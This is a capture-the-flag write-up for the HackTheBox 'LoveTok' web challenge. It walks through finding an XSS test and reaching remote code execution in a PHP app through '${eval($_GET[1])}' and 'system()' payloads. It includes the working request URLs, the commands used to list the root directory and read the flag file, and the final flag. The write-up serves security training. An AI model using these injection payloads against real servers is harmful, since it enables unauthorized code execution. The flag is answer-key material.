# LoveTok

Here we are give a webpage which randomly gives us a time, when you will find love.

and a button of nah, that dosn't work for me. Try again

![[Screenshot 2021-03-22 at 12.15.54 AM.png]]

and on clicking it shows a new date and time and url get interesting 

`http://138.68.191.86:30908/?format=r`
![[Screenshot 2021-03-22 at 12.17.03 AM.png]]

And it does have XSS `<img src\=1 href\=1 onerror\="javascript:alert(1)"\></img\>`

But here we are not getting an alert!

![[Screenshot 2021-03-22 at 1.04.30 AM.png]]


Luckily we have the source code of the web.
 and below is the snippet from router.php

```php
 	public function _match_route($route)
    {
        $uri = explode('/', strtok($_SERVER['REQUEST_URI'], '?'));
        $route = explode('/', $route);

        if (count($uri) != count($route)) return false;

        foreach ($route as $key => $value)
        {
            if ($uri[$key] != $value && $value != '{param}') return false;
        }

        return true;
    }
	
	public function getRouteParameters($route)
    {
        $params = [];
        $uri = explode('/', strtok($_SERVER['REQUEST_URI'], '?'));
        $route = explode('/', $route);

        foreach ($route as $key => $value)
        {
            if ($uri[$key] == $value) continue;
            if ($value == '{param}')
            {
                if ($uri[$key] == '')
                {
                    $this->abort(404);
                }
                $params[] = $uri[$key];
            }
        }

        return $params;
    }

```

after analyzing the source code, i tried sending `${phpinfo()}` as the parameter and it worked, got the php info page!
Interesting !

![[Screenshot 2021-03-22 at 12.41.24 AM.png]]

![[Screenshot 2021-03-22 at 12.42.52 AM.png]]

also the `system(ls)` works!
![[Screenshot 2021-03-22 at 12.45.06 AM.png]]

but `system("ls -la /")` does not work!

now upon more researching got this article about addlashes which led to RCE https://www.programmersought.com/article/30723400042/

and there is a payload given 

payloadï¼š`?str=${eval($_GET[1])}&1=phpinfo();`

on trying, this works!

http://138.68.191.86:30908/?format=${eval($_GET[1])}&1=system(%22ls%20-la%20/%22);

![[Screenshot 2021-03-22 at 12.53.25 AM.png]]

and here flag is flagKNkQn

reading flag  using `${eval($_GET[1])}&1=system("cat /flagKNkQn");`

![[Screenshot 2021-03-22 at 12.54.20 AM.png]]

got the flag == HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}